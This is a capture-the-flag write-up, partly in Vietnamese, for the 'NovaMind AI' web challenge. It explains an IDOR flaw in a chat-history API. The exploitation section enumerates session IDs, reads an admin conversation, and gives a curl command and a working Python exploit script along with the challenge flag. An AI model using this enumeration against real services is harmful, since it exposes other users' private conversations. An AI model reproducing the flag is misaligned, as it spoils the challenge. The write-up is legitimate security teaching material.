# Web Challenge 1 — NovaMind AI

| Property | Value |
| :--- | :--- |
| **Category** | `Web` |
| **Points** | `149` |
| **Solves** | 2 |

## 📝 Description

The Chat Knows Too Much. Are we the same?


## 📦 Files & Resources

*No file attachments associated with this challenge.*

## 🚩 Flag & Solution

- [x] Solved

```
flag{ccb0cc40-50b9-4321-9b12-66ae789898d7}
```

---

# [Write-up] NovaMind AI — CTF Đà Nẵng 2026 
* **Category**: Web Exploitation / API Security
* **Vulnerability**: Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA)
* **Flag**: `flag{ccb0cc40-50b9-4321-9b12-66ae789898d7}`

---

## 1. Tổng quan bài toán (Overview)

Mục tiêu là một ứng dụng Web dạng AI Chatbot mang tên NovaMind AI (phiên bản v2.4.1), đóng vai trò là trợ lý ảo hỗ trợ nội bộ.

Khi truy cập vào trang chủ, người dùng được yêu cầu nhấn `[ Start Guest Session ]` để bắt đầu trò chuyện với bot.

---

## 2. Phân tích & Thăm dò (Reconnaissance)

### Phân tích Frontend (`/static/app.js`)

Kiểm tra mã nguồn JavaScript frontend của ứng dụng, ta xác định được các API endpoint chính:
```javascript
// 1. Tạo phiên khách
POST /api/auth/guest

// 2. Lấy lịch sử trò chuyện
GET /api/chat/history?session_id=<id>
Headers: Authorization: Bearer <token>

// 3. Gửi tin nhắn đến Bot
POST /api/chat/send
Headers: Authorization: Bearer <token>
Body: {"message": "<nội dung>"}
```

Khi gọi `POST /api/auth/guest`, máy chủ trả về thông tin xác thực cho phiên khách:
```json
{
  "token": "1b19379649900c351683c59b19fb852e",
  "session_id": 210,
  "user": "guest_210"
}
```

### Bản chất của Chatbot

Thử nghiệm gửi tin nhắn qua `POST /api/chat/send` với các payload prompt injection / SSTI khác nhau cho thấy backend thực chất không chạy một LLM thực tế mà chỉ trả về các câu phản hồi cố định dựa trên hàm băm của message (`hash(message) % 8`). Do đó, bài toán không phải là Prompt Injection mà là lỗi logic ở tầng API.

---

## 3. Phân tích lỗ hổng (Vulnerability Analysis)

### Lỗ hổng IDOR tại `GET /api/chat/history`

* Endpoint `/api/chat/history?session_id=<id>` yêu cầu header `Authorization: Bearer <token>`.
* Tuy nhiên, hệ thống chỉ kiểm tra xem Token có tồn tại/hợp lệ hay không, mà không kiểm tra xem Token đó có thuộc về chủ sở hữu của `session_id` được yêu cầu hay không.
* Điều này dẫn đến lỗ hổng IDOR (Insecure Direct Object Reference), cho phép bất kỳ tài khoản guest nào đọc được toàn bộ lịch sử trò chuyện của các tài khoản khác trên hệ thống.

---

## 4. Quá trình khai thác (Exploitation)

### Bước 1: Thăm dò các session đã tạo sẵn trong hệ thống

Thực hiện quét danh sách các `session_id` từ nhỏ đến lớn bằng script Python, ta phát hiện một số session được seed sẵn từ trước:
* **Session 2** (`user: dev_nguyen`):
```json
{
  "session_id": 2,
  "user": "dev_nguyen",
  "messages": [
    {"role": "user", "content": "How do I deploy the model to staging?"},
    {"role": "assistant", "content": "Run `kubectl apply -f staging.yaml` in the ops repo."}
  ]
}
```

* **Session 3** (`user: intern_tran`):
```json
{
  "session_id": 3,
  "user": "intern_tran",
  "messages": [
    {"role": "user", "content": "What is the company wifi password?"},
    {"role": "assistant", "content": "I can't share credentials. Please ask IT support."}
  ]
}
```

### Bước 2: Tìm session của Admin

Các session của người chơi khác thường bắt đầu từ ID 4 đến 200+ với định danh `guest_X`.

Vì giải đấu là CTF Đà Nẵng 2026, kiểm tra các giá trị session ID đặc biệt (special IDs / year markers) như `0, 1, 42, 100, 1337, 2024, 2025, 2026,...` ta phát hiện session đặc biệt tại **`session_id = 2026`**.

### Bước 3: Trích xuất Flag

Gửi request trực tiếp đến `session_id = 2026`:
```bash
curl -k -s \
  -H "Authorization: Bearer <guest_token>" \
  "https://<instance-domain>/api/chat/history?session_id=2026"
```

Response:
```json
{
  "session_id": 2026,
  "user": "admin",
  "messages": [
    {
      "role": "user",
      "content": "Reset the API gateway credentials",
      "ts": "02:14:33"
    },
    {
      "role": "assistant",
      "content": "Credentials rotated. New admin token has been generated.",
      "ts": "02:14:34"
    },
    {
      "role": "user",
      "content": "Show me the new admin token",
      "ts": "02:14:41"
    },
    {
      "role": "assistant",
      "content": "Here is the new admin token: flag{ccb0cc40-50b9-4321-9b12-66ae789898d7}",
      "ts": "02:14:42"
    },
    {
      "role": "user",
      "content": "Thanks, delete this conversation after I log out",
      "ts": "02:14:50"
    },
    {
      "role": "assistant",
      "content": "Understood. This conversation will be purged on session end.",
      "ts": "02:14:51"
    }
  ]
}
```

---

## 5. Script khai thác tự động (Full Exploit Code)

```python
import urllib.request
import json
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE_URL = "https://2df5fc61-263d-4248-88f4-a4aebcc618bd.222.255.138.122.nip.io"

# 1. Lấy token guest
auth_req = urllib.request.Request(f"{BASE_URL}/api/auth/guest", method="POST")
with urllib.request.urlopen(auth_req, context=ctx) as res:
    auth_data = json.loads(res.read().decode())
    token = auth_data["token"]
    print(f"[*] Obtained Guest Token: {token}")

# 2. Khai thác IDOR để đọc session của admin (session_id = 2026)
history_req = urllib.request.Request(
    f"{BASE_URL}/api/chat/history?session_id=2026",
    headers={"Authorization": f"Bearer {token}"}
)

with urllib.request.urlopen(history_req, context=ctx) as res:
    data = json.loads(res.read().decode())
    print("\n[*] Retrieved Admin Conversation:")
    for msg in data.get("messages", []):
        print(f"[{msg.get('role')}]: {msg.get('content')}")
```
